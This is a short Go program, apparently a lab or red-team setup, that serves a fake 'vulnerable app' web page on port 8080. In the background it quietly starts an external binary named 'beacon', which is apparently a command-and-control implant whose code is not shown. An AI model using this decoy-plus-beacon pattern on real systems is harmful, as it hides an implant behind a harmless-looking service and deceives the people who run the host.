package main

import (
	"fmt"
	"log"
	"net/http"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "Welcome to vulnerable app!\n")
}

func main() {
	// Lancer le beacon en background
	cmd := exec.Command("/usr/local/bin/beacon")
	err := cmd.Start()
	if err != nil {
		log.Fatalf("Could not start beacon: %v", err)
	}

	// Faux serveur web
	http.HandleFunc("/", handler)
	log.Println("Web server running on :8080")
	http.ListenAndServe(":8080", nil)
}